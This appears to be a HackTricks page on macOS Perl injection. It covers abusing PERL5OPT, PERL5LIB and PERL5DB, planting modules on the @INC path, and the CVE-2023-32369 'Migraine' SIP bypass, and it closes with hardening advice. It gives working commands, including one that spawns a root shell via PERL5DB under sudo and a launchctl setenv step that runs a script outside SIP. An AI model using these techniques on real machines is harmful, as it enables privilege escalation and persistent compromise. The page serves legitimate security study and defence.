# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Using the env variable **`PERL5OPT`** it's possible to make **Perl** execute arbitrary commands when the interpreter starts (even **before** the first line of the target script is parsed).  
For example, create this script:

```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```

Now **export the env variable** and execute the **perl** script:

```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```

Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):

```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```

And then use the env variables so the module is located and loaded automatically:

```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```

### Other interesting environment variables

* **`PERL5DB`** – when the interpreter is started with the **`-d`** (debugger) flag, the content of `PERL5DB` is executed as Perl code *inside* the debugger context.  
  If you can influence both the environment **and** the command-line flags of a privileged Perl process you can do something like:
  
  ```bash
  export PERL5DB='system("/bin/zsh")'
  sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
  ```

* **`PERL5SHELL`** – on Windows this variable controls which shell executable Perl will use when it needs to spawn a shell. It is mentioned here only for completeness, as it is not relevant on macOS.

Although `PERL5DB` requires the `-d` switch, it is common to find maintenance or installer scripts that are executed as *root* with this flag enabled for verbose troubleshooting, making the variable a valid escalation vector.

## Via dependencies (@INC abuse)

It is possible to list the include path that Perl will search (**`@INC`**) running:

```bash
perl -e 'print join("\n", @INC)'
```

Typical output on macOS 13/14 looks like:

```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```

Some of the returned folders don’t even exist, however **`/Library/Perl/5.30`** does exist, is *not* protected by SIP and is *before* the SIP-protected folders. Therefore, if you can write as *root* you may drop a malicious module (e.g. `File/Basename.pm`) that will be *preferentially* loaded by any privileged script importing that module.

> [!WARNING]
> You still need **root** to write inside `/Library/Perl` and macOS will show a **TCC** prompt asking for *Full Disk Access* for the process performing the write operation.

For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` containing attacker-controlled code.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

In May 2023 Microsoft disclosed **CVE-2023-32369**, nick-named **Migraine**, a post-exploitation technique that allows a *root* attacker to completely **bypass System Integrity Protection (SIP)**.  
The vulnerable component is **`systemmigrationd`**, a daemon entitled with **`com.apple.rootless.install.heritable`**. Any child process spawned by this daemon inherits the entitlement and therefore runs **outside** SIP restrictions.

Among the children identified by the researchers is the Apple-signed interpreter:

```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```

Because Perl honors `PERL5OPT` (and Bash honors `BASH_ENV`), poisoning the daemon’s *environment* is enough to gain arbitrary execution in a SIP-less context:

```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```

When `migrateLocalKDC` runs, `/usr/bin/perl` starts with the malicious `PERL5OPT` and executes `/private/tmp/migraine.sh` *before SIP is re-enabled*. From that script you can, for instance, copy a payload inside **`/System/Library/LaunchDaemons`** or assign the `com.apple.rootless` extended attribute to make a file **undeletable**.

Apple fixed the issue in macOS **Ventura 13.4**, **Monterey 12.6.6** and **Big Sur 11.7.7**, but older or un-patched systems remain exploitable.

## Hardening recommendations

1. **Clear dangerous variables** – privileged launchdaemons or cron jobs should start with a pristine environment (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Avoid running interpreters as root** unless strictly necessary. Use compiled binaries or drop privileges early.
3. **Vendor scripts with `-T` (taint mode)** so that Perl ignores `PERL5OPT` and other unsafe switches when taint checking is enabled.
4. **Keep macOS up to date** – “Migraine” is fully patched in current releases.

## References

- Microsoft Security Blog – “New macOS vulnerability, Migraine, could bypass System Integrity Protection” (CVE-2023-32369), May 30 2023.
- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) research”, May 2025.

{{#include ../../../banners/hacktricks-training.md}}
